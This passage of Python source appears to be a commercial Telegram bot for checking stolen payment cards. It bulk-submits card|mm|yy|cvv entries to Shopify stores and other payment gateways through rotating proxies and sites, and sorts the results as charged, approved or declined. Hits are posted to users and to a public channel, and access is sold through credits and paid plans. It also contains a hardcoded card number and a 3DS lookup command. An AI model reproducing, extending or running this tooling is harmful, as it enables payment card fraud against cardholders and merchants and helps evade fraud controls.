            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            # Rotate proxy on any SiteError (e.g. stableId extract fail), not only proxy-keyword errors
            if proxy_data:
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1:
            backoff = min(0.1 * (2 ** attempt) + random.uniform(0, 0.1), 2.0)
            await asyncio.sleep(backoff)
    if last:
        last["Status"] = "Error"
        return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1


async def test_site(site, proxy_data=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        api_site = site if site.startswith('http') else f'https://{site}'
        url = build_api_url(api_site, test_card, proxy_data)
        s = await get_site_session()
        async with s.get(url) as resp:
            if resp.status != 200:
                return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
            try:
                raw = await resp.json(content_type=None)
            except Exception:
                return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON'}
        rm = str(raw.get('Response', '') or '')
        gw = extract_gateway_from_api(raw)
        price = raw.get('Price', '-')
        if price and price != '-':
            price = f"${price}"
        if is_site_error(rm.lower()):
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm, 'gateway': gw}
        if has_restricted_gateway(rm, gw):
            # Mark dead so /add skips and /site removes Authorize.Net / ONERWAY Direct
            return {
                'site': site,
                'status': 'dead',
                'price': price,
                'response': f"RESTRICTED | {gw} | {rm}" if gw else f"RESTRICTED | {rm}",
                'gateway': gw,
            }
        if not is_truly_alive(rm, price):
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm, 'gateway': gw}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm, 'gateway': gw}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ====================== UNIVERSAL MASS GATE CHECK ======================
def _get_gate_func(gate_cmd):
    return {"msp": None}.get(gate_cmd)


def _get_gate_sem(gate_cmd, user_id=None):
    if user_id is not None:
        return _get_user_mass_sem(user_id, gate_cmd)
    return {"msp": _MSP_SEM}.get(gate_cmd)


async def _mass_gate_check(event, gate_name, gate_cmd, api_func, mass_sem, is_auth_gate=False, is_shopify=False):
    if not await force_join_check(event):
        return
    uid = event.sender_id
    cd = check_global_cooldown(uid, f"mass_{gate_cmd}", 3)
    if cd > 0 and uid not in ADMIN_ID:
        return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd}{bs('s')}</code>")
    _, at, plan = await get_user_access(event)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        credits = await get_user_credits(uid)
        if credits <= 0:
            return await styled_reply(event, f"""{bs('No Credits Left')} {PE}
{PE} {bs('Balance')} ━ <code>0</code>""", buttons=[[pbtn(bs("Buy Credits"), url="https://t.me/ravenu899")]], emoji_ids=[CE["stop"], CE["chart"]])
    cl = get_cc_limit(plan, uid)
    for key, proc in ACTIVE_MTXT_PROCESSES.items():
        if isinstance(proc, dict) and proc.get("user_id") == uid and not proc.get("stopped", False):
            return await styled_reply(event, f"""{PE} {bs('Already running')}
{PE} <code>/stop {proc.get('session_id', '?')}</code>""", emoji_ids=[CE["warn"], CE["stop"]])
    content = ""
    cmd_text = re.sub(rf'^[/.]{gate_cmd}\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text:
        content = cmd_text
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm:
            return await styled_reply(event, f"{PE} {bs('Message not found')}", emoji_ids=[CE["warn"]])
        if rm.document:
            fp = await rm.download_media()
            try:
                async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                os.remove(fp)
            except Exception:
                try:
                    os.remove(fp)
                except Exception:
                    pass
                return
        elif rm.text:
            content = rm.text
        else:
            return await styled_reply(event, f"{PE} {bs('No content found')}", emoji_ids=[CE["warn"]])
    else:
        return await styled_reply(event, f"{PE} {bs('Reply to .txt or text with')} <code>/{gate_cmd}</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} {bs('No valid cards')}", emoji_ids=[CE["cross"]])
    tf = len(cards)
    if len(cards) > cl:
        cards = cards[:cl]
    session_id = generate_session_id()
    log_user(uid, f"{gate_cmd.upper()}_MASS_INIT", f"Cards={tf} | Using={len(cards)} | Session={session_id}")
    ACTIVE_MTXT_PROCESSES[session_id] = {"stopped": False, "tasks": [], "user_id": uid, "session_id": session_id}
    user_sem = _get_user_mass_sem(uid, gate_cmd)
    
    # DMs are sent for Approved cards only if it is an auth gate, charge gates only DM Charged cards
    send_approved = is_auth_gate
    asyncio.create_task(_run_mass_process(event, cards, gate_name, gate_cmd, api_func, user_sem, session_id, is_auth_gate, is_shopify, send_approved))


async def _run_mass_process(event, cards, gate_name, gate_cmd, api_func, mass_sem, session_id, is_auth_gate, is_shopify, send_approved):
    uid = event.sender_id
    plan = await get_user_plan(uid)
    name, username, tag, prof = await get_user_info(uid)
    proc_key = session_id
    total = len(cards)
    checked = charged = approved = declined = errors = 0
    st = time.time()
    hits = []
    rotator = SmartRotator() if is_shopify else None
    sites = None
    proxies = None
    if is_shopify:
        owner_sites, owner_proxies = await get_owner_check_resources("shopify")
        sites = owner_sites
        proxies = owner_proxies
        if not sites:
            ACTIVE_MTXT_PROCESSES.pop(proc_key, None)
            return await reply_no_sites(event)
        if not proxies:
            ACTIVE_MTXT_PROCESSES.pop(proc_key, None)
            return await reply_no_proxy(event, gate="shopify")
    log_user(uid, f"{gate_cmd.upper()}_MASS_START", f"Cards={total} | Session={session_id}")
    sm = await styled_reply(event, format_mass_progress(gate_name, "CHECKING", 0, total, 0, 0, 0, 0, "0s", session_id), buttons=make_mass_buttons(0, 0, 0, total), emoji_ids=get_mass_progress_emojis("CHECKING"))

    def is_stopped():
        proc = ACTIVE_MTXT_PROCESSES.get(proc_key)
        if not proc:
            return True
        return proc.get("stopped", False) if isinstance(proc, dict) else False

    _ui_lock = asyncio.Lock()
    _last_ui_update = 0

    async def _update_ui_batch(force=False):
        nonlocal checked, approved, charged, declined, errors, _last_ui_update
        if not force:
            # Limit edits to once every 5.0 seconds to prevent Telegram Flood Wait
            if time.time() - _last_ui_update < 5.0:
                return
        async with _ui_lock:
            _last_ui_update = time.time()
            elapsed = format_elapsed(time.time() - st)
            try:
                await styled_edit(sm, format_mass_progress(gate_name, "CHECKING", checked, total, approved, charged, declined, errors, elapsed, session_id), buttons=make_mass_buttons(approved, charged, declined, total), emoji_ids=get_mass_progress_emojis("CHECKING"))
            except Exception as e:
                log_system("STYLED_EDIT_ERR", f"Error={repr(e)}", "error")

    local_session = None
    if is_shopify:
        local_session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10),
            connector=aiohttp.TCPConnector(
                limit=250,
                limit_per_host=250,
                ttl_dns_cache=300,
                use_dns_cache=True,
                enable_cleanup_closed=True,
                force_close=False
            )
        )

    async def get_local_session():
        return local_session

    async def worker(card):
        nonlocal checked, charged, approved, declined, errors
        if is_stopped():
            return
        async with mass_sem:
            if is_stopped():
                return
            try:
                if is_shopify:
                    result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=is_stopped, session_getter=get_local_session)
                else:
                    result = await api_func(card, uid)
                if is_stopped():
                    return
                status = result.get("Status", "Declined")
                resp = result.get("Response", "")
                gw = result.get("Gateway", gate_name)
                price = result.get("Price", "-")
                checked += 1
                await _record_gate_result(gate_cmd, status not in ["SiteError", "Error"])
                if uid not in ADMIN_ID and not is_paid_plan(plan):
                    await deduct_credit(uid, 1)
                log_user(uid, f"{gate_cmd.upper()}_MASS_CARD", f"Card={card} | Status={status} | Gateway={gw} | {checked}/{total}")
                if status in ["SiteError", "Error"]:
                    errors += 1
                elif status == "Charged":
                    charged += 1
                    hits.append(f"{card} - CHARGED - {resp} - {gw}")
                    fire_and_forget(track_user_stats(uid, "CHARGED"))
                    fire_and_forget(_send_mass_hit(card, result, status, uid, name, tag, prof, gate_name, is_auth_gate, gw, is_shopify))
                elif status == "Approved":
                    approved += 1
                    hits.append(f"{card} - APPROVED - {resp} - {gw}")
                    fire_and_forget(track_user_stats(uid, "APPROVED"))
                    if send_approved or is_auth_gate:
                        fire_and_forget(_send_mass_hit(card, result, status, uid, name, tag, prof, gate_name, is_auth_gate, gw, is_shopify))
                else:
                    declined += 1
                    fire_and_forget(track_user_stats(uid, "DECLINED"))
                limit = PER_USER_MASS_WORKERS.get(gate_cmd, 15)
                if checked % limit == 0 or checked == total:
                    fire_and_forget(_update_ui_batch(force=(checked == total)))
            except asyncio.CancelledError:
                return
            except Exception as e:
                if not is_stopped():
                    errors += 1
                    checked += 1
                    log_user(uid, f"{gate_cmd.upper()}_MASS_ERR", f"Card={card} | Error={e}", "error")
                    limit = PER_USER_MASS_WORKERS.get(gate_cmd, 15)
                    if checked % limit == 0 or checked == total:
                        fire_and_forget(_update_ui_batch(force=(checked == total)))

    try:
        tasks = [asyncio.create_task(worker(c)) for c in cards]
        proc = ACTIVE_MTXT_PROCESSES.get(proc_key)
        if isinstance(proc, dict):
            proc["tasks"] = tasks
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception:
            pass
        await asyncio.sleep(0.3)
        elapsed = format_elapsed(time.time() - st)
        status_label = "STOPPED" if is_stopped() else "FINISHED"
        log_user(uid, f"{gate_cmd.upper()}_MASS_DONE", f"Charged={charged} | Approved={approved} | Declined={declined} | Errors={errors} | {checked}/{total} | {elapsed}")
        for _ in range(3):
            try:
                await styled_edit(sm, format_mass_progress(gate_name, status_label, checked, total, approved, charged, declined, errors, elapsed, session_id), buttons=make_mass_buttons(approved, charged, declined, total), emoji_ids=get_mass_progress_emojis(status_label))
                break
            except Exception:
                await asyncio.sleep(0.5)
        fire_and_forget(_send_mass_final_file(uid, charged, approved, declined, errors, total, hits, gate_name, gate_cmd, session_id))
    finally:
        ACTIVE_MTXT_PROCESSES.pop(proc_key, None)
        _cleanup_user_mass_sem(uid, gate_cmd)
        if local_session:
            await local_session.close()


_USER_DM_LOCKS = {}
_CHANNEL_HIT_LOCK = asyncio.Lock()

def get_user_dm_lock(uid):
    if uid not in _USER_DM_LOCKS:
        _USER_DM_LOCKS[uid] = asyncio.Lock()
    return _USER_DM_LOCKS[uid]


async def _send_charged_to_channel(status, gw, resp, name, prof, tag):
    """Send Charged hit to HIT_CHANNEL only (no DM). Used by /sp, /sh."""
    if status != "Charged":
        return
    try:
        status_emoji = get_status_emoji_id(status)
        ch_msg, ch_emoji_ids = format_channel_hit(
            status, gw, (resp or "")[:150], name, prof, tag,
            price=None, status_emoji_id=status_emoji,
        )
        async with _CHANNEL_HIT_LOCK:
            try:
                await styled_send(
                    HIT_CHANNEL_ID,
                    ch_msg,
                    buttons=get_hit_button(status, is_channel=True),
                    emoji_ids=ch_emoji_ids,
                )
                await asyncio.sleep(2.5)
            except Exception:
                pass
    except Exception:
        pass


async def _send_mass_hit(card, result, status, uid, name, tag, prof, gate_name, is_auth_gate, gw, is_shopify=False):
    await asyncio.sleep(HIT_DELAY)
    try:
        resp = result.get('Response', '')[:150]
        if is_auth_gate and 'succeeded' not in resp.lower():
            return
        bi = await get_bin_info(card.split("|")[0])
        price = result.get('Price', '-')
        
        # Append price to Shopify Payments gateway if it exists
        if is_shopify and price and price != "-":
            gw = f"{gw} {price}"
            
        owner_proxies = await get_owner_proxies("shopify")
        proxy_status = None
        emoji_ids = [get_status_emoji_id(status), 5447453226498552490]
        if owner_proxies:
            proxy_status = "Live"
            emoji_ids.append(4958610528588008305)
            
        dm_msg = format_mass_hit_dm(status, card, gw, resp, bi, name, prof, tag, proxy_status=proxy_status)
        
        # Send DM using user-specific lock
        async with get_user_dm_lock(uid):
            try:
                await styled_send(uid, dm_msg, buttons=get_hit_button(status), emoji_ids=emoji_ids)
                await asyncio.sleep(2.5)  # Spacing out DMs to the user to avoid rate limits
            except Exception:
                pass
                
        send_to_channel = False
        if is_auth_gate and status == "Approved":
            send_to_channel = True
        elif not is_auth_gate and status == "Charged":
            send_to_channel = True
        if send_to_channel:
            status_emoji = get_status_emoji_id(status)
            ch_msg, ch_emoji_ids = format_channel_hit(status, gw, resp, name, prof, tag, price=None, status_emoji_id=status_emoji)
            # Send to channel using channel-specific lock
            async with _CHANNEL_HIT_LOCK:
                try:
                    await styled_send(HIT_CHANNEL_ID, ch_msg, buttons=get_hit_button(status, is_channel=True), emoji_ids=ch_emoji_ids)
                    await asyncio.sleep(2.5)  # Spacing out public channel hits to avoid rate limits
                except Exception:
                    pass
    except Exception:
        pass


async def _send_mass_final_file(uid, charged, approved, declined, errors, total, hits, gate_name, gate_cmd, session_id):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"razor_x_{gate_cmd}_{session_id}_{ts}.txt"
    try:
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'=' * 49}\nRAZOR X {gate_name.upper()} RESULTS\n{'=' * 49}\n\n")
            await f.write(f"Session ID: {session_id}\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
            if hits:
                await f.write(f"\n{'=' * 49}\nHITS\n{'=' * 49}\n\n")
                for h in hits:
                    await f.write(h + "\n")
        try:
            await styled_send(uid, f"{bs('Session')} ➛ <code>{session_id}</code>\n{bs('Gate')} ➛ {bs(gate_name)}\n{bs('Charged')} ━ {bs(str(charged))} | {bs('Approved')} ━ {bs(str(approved))}", file=fn, buttons=get_hit_button(status="charged" if charged > 0 else ("approved" if approved > 0 else "declined")))
        except Exception:
            pass
        try:
            os.remove(fn)
        except Exception:
            pass
    except Exception:
        pass


# ====================== VBV COMMAND ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]vbv\b'))
async def vbv_cmd(event):
    if not await force_join_check(event):
        return
    uid = event.sender_id
    cd = check_global_cooldown(uid, "vbv", 2)
    if cd > 0 and uid not in ADMIN_ID:
        return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd}{bs('s')}</code>")
    _, at = await can_use(uid, event.chat)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        credits = await get_user_credits(uid)
        if credits <= 0:
            return await styled_reply(event, f"""{bs('No Credits Left')} {PE}
{PE} {bs('Balance')} ━ <code>0</code>""", buttons=[[pbtn(bs("Buy Credits"), url="https://t.me/ravenu899")]], emoji_ids=[CE["stop"], CE["chart"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        if not is_group:
            return await send_group_only_message(event)
        if plan == FREE_PLAN and uid in _VBV_LAST_USE:
            elapsed = time.time() - _VBV_LAST_USE[uid]
            if elapsed < 10:
                remaining = 10 - int(elapsed)
                return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{remaining}{bs('s')}</code>")
        cd2 = get_free_gate_cooldown(uid, "vbv")
        if cd2 > 0:
            return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd2}{bs('s')}</code>")

    card = None
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm and rm.text:
            cc = extract_cc(rm.text)
            if cc:
                card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc:
            card = cc[0]
    if not card:
        return await styled_reply(event, f"{PE} <code>/vbv card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])

    name, username, tag, prof = await get_user_info(uid)
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        set_free_gate_last_use(uid, "vbv")
        if plan == FREE_PLAN:
            _VBV_LAST_USE[uid] = time.time()

    log_user(uid, "VBV_START", f"Card={card}")
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    try:
        async with _VBV_SEM:
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result = await check_vbv_api(card)
            bi = await bin_task
        status = result.get('Status', 'Declined')
        gw = result.get('Gateway', '3DS Lookup')
        await _record_gate_result("vbv", status not in ["Error"])
        if uid not in ADMIN_ID and not is_paid_plan(plan) and status != "Error":
            await deduct_credit(uid, 1)
        msg = format_single_result(status, card, gw, result.get('Response', '')[:150], bi, name, prof, tag)
        await lm.delete()
        await styled_reply(event, msg, buttons=get_hit_button(status), emoji_ids=[get_status_emoji_id(status), 5447453226498552490])
    except Exception as e:
        await lm.delete()
        await styled_reply(event, f"{PE} {bs('Error')} ━ <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== FEEDBACK COMMAND ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]fb\b'))
async def feedback_cmd(event):
    if not await force_join_check(event):
        return
    uid = event.sender_id
    cd = check_global_cooldown(uid, "fb", 5)
    if cd > 0 and uid not in ADMIN_ID:
        return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd}{bs('s')}</code>")

    comment = re.sub(r'^[/.]fb\s*', '', event.raw_text, flags=re.IGNORECASE).strip()

    if not event.reply_to_msg_id:
        return await styled_reply(event, f"""{bs('Feedback')} {PE}
━━━━━━━━━━━━━━━━━
{PE} {bs('Usage')} ➛ {bs('Reply to your hit message with')} <code>/fb</code>""", emoji_ids=[CE["fire"], CE["info"]])
    rm = await event.get_reply_message()
    if not rm:
        return await styled_reply(event, f"{PE} {bs('Message not found')}", emoji_ids=[CE["warn"]])
    has_media = False
    media_type = "unknown"
    if rm.photo:
        has_media = True
        media_type = "photo"
    elif rm.gif or rm.sticker:
        has_media = True
        media_type = "gif"
    elif rm.video:
        has_media = True
        media_type = "video"
    elif rm.document:
        mime = getattr(rm.document, 'mime_type', '') or ''
        if mime.startswith('image/') or mime.startswith('video/') or 'gif' in mime:
            has_media = True
            media_type = "document_media"
    if not has_media:
        return await styled_reply(event, f"""{bs('Invalid')} {PE}
{PE} {bs('Only photo, gif or video allowed')}
{PE} {bs('Reply to a message with media')}""", emoji_ids=[CE["cross"], CE["warn"], CE["info"]])

    name, username, tag, prof = await get_user_info(uid)
    feedback_text = f"""{bs('FEEDBACK')} 💎
{bs('USER')} ➛ {user_link_html(uid, name)}
{bs('USER ID')} ➛ <code>{uid}</code>"""
    if comment:
        feedback_text += f"\n━━━━━━━━━━━━━━━━━\n{html.escape(comment)}"

    buy_kb = [[pbtn(bs("Buy Now"), url="https://t.me/ravenu899", color="blue")]]
    submitted_ui = f"""━━━━━━━━━━━━━━━━
{bs('Feedback Submitted')} {PE}
━━━━━━━━━━━━━━━━"""
    submitted_emoji = [5436196151575459790]

    try:
        # Owner/admin: post straight to Hits (no Approve/Decline)
        if uid in ADMIN_ID:
            await styled_send(
                HITS_CHANNEL_ID,
                feedback_text,
                buttons=buy_kb,
                file=rm.media,
            )
            fire_and_forget(save_feedback(uid, name, rm.id, event.chat_id, media_type))
            log_user(uid, "FEEDBACK", f"Type={media_type} | Owner direct to Hits")
            await styled_reply(event, submitted_ui, emoji_ids=submitted_emoji)
            return

        # Users: owner must Approve / Decline first
        fb_id = uuid.uuid4().hex[:10]
        approve_kb = [[
            pbtn(bs("Approve"), f"fb_ap:{fb_id}", color="green"),
            pbtn(bs("Decline"), f"fb_de:{fb_id}", color="red"),
        ]]
        owner_msgs = []
        for admin_id in ADMIN_ID:
            try:
                om = await styled_send(
                    admin_id,
                    feedback_text,
                    buttons=approve_kb,
                    file=rm.media,
                )
                if om is not None:
                    owner_msgs.append(om)
            except Exception as e:
                log_user(uid, "FEEDBACK_OWNER_DM_ERR", f"Admin={admin_id} Error={e}", "error")

        if not owner_msgs:
            return await styled_reply(event, f"{PE} {bs('Could not reach owner. Try again.')}", emoji_ids=[CE["cross"]])

        _PENDING_FEEDBACK[fb_id] = {
            "uid": uid,
            "name": name,
            "prof": prof,
            "caption": feedback_text,
            "media": rm.media,
            "media_type": media_type,
            "comment": comment,
            "src_chat_id": event.chat_id,
            "src_msg_id": rm.id,
            "owner_msgs": owner_msgs,
            "status": "pending",
        }
        log_user(uid, "FEEDBACK_PENDING", f"Id={fb_id} | Type={media_type} | Owners={len(owner_msgs)}")
        await styled_reply(event, submitted_ui, emoji_ids=submitted_emoji)
    except Exception as e:
        log_user(uid, "FEEDBACK_ERR", f"Error={e}", "error")
        await styled_reply(event, f"{PE} {bs('Error')} ━ <code>{e}</code>", emoji_ids=[CE["cross"]])


async def _fb_delete_owner_dms(pending):
    """Remove approval messages from owner DMs only (Hits channel untouched)."""
    for msg in pending.get("owner_msgs") or []:
        try:
            await msg.delete()
        except Exception:
            try:
                await client_instance.delete_messages(msg.chat_id, [msg.id])
            except Exception:
                pass
    pending["owner_msgs"] = []


@client.on(events.CallbackQuery(pattern=rb"fb_ap:(.+)"))
async def fb_approve_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer(f"{bs('Not allowed')}", alert=True)
    fb_id = event.pattern_match.group(1).decode()
    pending = _PENDING_FEEDBACK.get(fb_id)
    if not pending or pending.get("status") != "pending":
        return await event.answer(f"{bs('Already handled.')}", alert=True)
    pending["status"] = "approved"
    caption = pending.get("caption") or f"{bs('FEEDBACK')}"
    media = pending.get("media")
    buy_kb = [[pbtn(bs("Buy Now"), url="https://t.me/ravenu899", color="blue")]]
    try:
        await styled_send(HITS_CHANNEL_ID, caption, buttons=buy_kb, file=media)
        fire_and_forget(save_feedback(
            pending.get("uid"),
            pending.get("name") or "User",
            pending.get("src_msg_id") or 0,
            pending.get("src_chat_id") or 0,
            pending.get("media_type") or "unknown",
        ))
        log_user(pending.get("uid") or event.sender_id, "FEEDBACK_APPROVED", f"Id={fb_id} | By={event.sender_id}")
    except Exception as e:
        pending["status"] = "pending"
        log_system("FEEDBACK_APPROVE_ERR", f"Id={fb_id} Error={e}", "error")
        return await event.answer(f"{bs('Failed to post')}", alert=True)
    await _fb_delete_owner_dms(pending)
    _PENDING_FEEDBACK.pop(fb_id, None)
    await event.answer(f"{bs('Approved')} ✓")


@client.on(events.CallbackQuery(pattern=rb"fb_de:(.+)"))
async def fb_decline_cb(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer(f"{bs('Not allowed')}", alert=True)
    fb_id = event.pattern_match.group(1).decode()
    pending = _PENDING_FEEDBACK.get(fb_id)
    if not pending or pending.get("status") != "pending":
        return await event.answer(f"{bs('Already handled.')}", alert=True)
    pending["status"] = "declined"
    log_user(pending.get("uid") or event.sender_id, "FEEDBACK_DECLINED", f"Id={fb_id} | By={event.sender_id}")
    await _fb_delete_owner_dms(pending)
    _PENDING_FEEDBACK.pop(fb_id, None)
    await event.answer(f"{bs('Declined')}")


@client.on(events.CallbackQuery(pattern=rb"fb_done:(.+)"))
async def fb_done_cb(event):
    await event.answer(f"{bs('Already handled')}")


# ====================== SINGLE COMMANDS ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def sp_single(event):
    if not await force_join_check(event):
        return
    uid = event.sender_id
    cd = check_global_cooldown(uid, "sp", 2)
    if cd > 0 and uid not in ADMIN_ID:
        return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd}{bs('s')}</code>")
    _, at = await can_use(uid, event.chat)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        credits = await get_user_credits(uid)
        if credits <= 0:
            return await styled_reply(event, f"""{bs('No Credits Left')} {PE}
{PE} {bs('Balance')} ━ <code>0</code>""", buttons=[[pbtn(bs("Buy Credits"), url="https://t.me/ravenu899")]], emoji_ids=[CE["stop"], CE["chart"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        if not is_group:
            return await send_group_only_message(event)
        cd2 = get_free_sp_cooldown_remaining(uid)
        if cd2 > 0:
            return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd2}{bs('s')}</code>")
    name, username, tag, prof = await get_user_info(uid)
    sites, proxies = await get_owner_check_resources("shopify")
    if not sites:
        return await styled_reply(event, f"""{PE} {bs('No shared sites available')}
{PE} {bs('Please try again later')}""", emoji_ids=[CE["warn"], CE["info"]])
    if not proxies:
        return await reply_no_proxy(event, gate="shopify")
    card = None
    if event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm and rm.text:
            cc = extract_cc(rm.text)
            if cc:
                card = cc[0]
    if not card:
        cc = extract_cc(event.message.text)
        if cc:
            card = cc[0]
    if not card:
        return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        set_free_sp_last_use(uid)
    log_user(uid, "SP_START", f"Card={card} | Sites={len(sites)}")
    lm = await styled_reply(event, f"{bs('Processing')}… ⏳")
    try:
        async with _SP_SEM:
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            # Shared rotator → consecutive /sp checks rotate sites; SiteError also rotates within the check
            result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, _SP_ROTATOR, session_getter=get_sp_session)
            bi = await bin_task
        status = result.get('Status', 'Declined')
        gw = result.get('Gateway', 'Shopify Payments')
        price = result.get('Price', '-')
        await _record_gate_result("sp", status not in ["Error", "SiteError"])
        if uid not in ADMIN_ID and not is_paid_plan(plan):
            await deduct_credit(uid, 1)
        
        # Append price to Shopify Payments gateway if it exists
        if price and price != "-":
            gw = f"{gw} {price}"
            
        if status in ["Charged", "Approved", "Declined"]:
            fire_and_forget(track_user_stats(uid, status.upper()))
            
        msg = format_single_result(status, card, gw, result.get('Response', '')[:150], bi, name, prof, tag)
        await lm.delete()
        await styled_reply(event, msg, buttons=get_hit_button(status), emoji_ids=[get_status_emoji_id(status), 5447453226498552490])
        if status == "Charged":
            fire_and_forget(_send_charged_to_channel(status, gw, result.get('Response', ''), name, prof, tag))
    except Exception as e:
        await lm.delete()
        await styled_reply(event, f"{PE} {bs('Error')} ━ <code>{e}</code>", emoji_ids=[CE["cross"]])


async def _run_sh_process(event, cards, session_id, sites, proxies, uid, plan, name, tag="TRIAL", prof="#"):
    proc_key = session_id
    session = ACTIVE_SH_SESSIONS.get(proc_key)
    if not session:
        return
    sm = session["msg"]
    rotator = SmartRotator()
    total = len(cards)

    try:
        for card in cards:
            if session.get("stopped"):
                break
            try:
                async with _SP_SEM:
                    bin_task = asyncio.create_task(get_bin_info(card.split("|")[0]))
                    result, _ = await check_card_with_retry(
                        card, sites, uid, proxies, 3, rotator, session_getter=get_sp_session
                    )
                    bi = await bin_task
                status = result.get("Status", "Declined")
                resp = result.get("Response", "")
                gw = result.get("Gateway", "Shopify Payments")
                price = result.get("Price", "-")
                await _record_gate_result("sp", status not in ["Error", "SiteError"])
                if uid not in ADMIN_ID and not is_paid_plan(plan):
                    await deduct_credit(uid, 1)
                if price and price != "-":
                    gw = f"{gw} {price}"
                if status in ["Charged", "Approved", "Declined"]:
                    fire_and_forget(track_user_stats(uid, status.upper()))
                if status == "Charged":
                    fire_and_forget(_send_charged_to_channel(status, gw, resp, name, prof, tag))
                log_user(uid, "SH_CARD", f"Card={card} | Status={status} | {len(session['results']) + 1}/{total}")
                session["results"].append({
                    "card": card,
                    "status": status,
                    "response": resp,
                    "gateway": gw,
                    "bin_info": bi,
                })
                await _edit_sh_message(sm, session, force_latest=True)
            except Exception as e:
                log_user(uid, "SH_CARD_ERR", f"Card={card} | Error={e}", "error")
                session["results"].append({
                    "card": card,
                    "status": "Error",
                    "response": str(e)[:120],
                    "gateway": "Shopify Payments",
                    "bin_info": await get_bin_info(card.split("|")[0]),
                })
                await _edit_sh_message(sm, session, force_latest=True)

        session["done"] = True
        await _edit_sh_message(sm, session, force_latest=True)
        log_user(uid, "SH_DONE", f"Cards={len(session['results'])}/{total} | Session={session_id}")
    except Exception as e:
        log_user(uid, "SH_FAIL", f"Error={e}", "error")
        session["done"] = True
        try:
            await styled_edit(sm, f"{PE} {bs('Error')} ━ <code>{html.escape(str(e)[:120])}</code>", emoji_ids=[CE["cross"]])
        except Exception:
            pass


def _cleanup_sh_sessions(uid):
    for sid, proc in list(ACTIVE_SH_SESSIONS.items()):
        if proc.get("user_id") == uid:
            ACTIVE_SH_SESSIONS.pop(sid, None)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_mass(event):
    if not await force_join_check(event):
        return
    uid = event.sender_id
    cd = check_global_cooldown(uid, "sh", 3)
    if cd > 0 and uid not in ADMIN_ID:
        return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd}{bs('s')}</code>")
    _, at = await can_use(uid, event.chat)
    if at == "banned":
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(uid)
    is_group = event.chat.id != uid
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        credits = await get_user_credits(uid)
        if credits <= 0:
            return await styled_reply(event, f"""{bs('No Credits Left')} {PE}
{PE} {bs('Balance')} ━ <code>0</code>""", buttons=[[pbtn(bs("Buy Credits"), url="https://t.me/ravenu899")]], emoji_ids=[CE["stop"], CE["chart"]])
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        if not is_group:
            return await send_group_only_message(event)
        cd2 = get_free_sp_cooldown_remaining(uid)
        if cd2 > 0:
            return await styled_reply(event, f"⚠️ {bs('Slow Down!')}\n{bs('Wait')} <code>{cd2}{bs('s')}</code>")
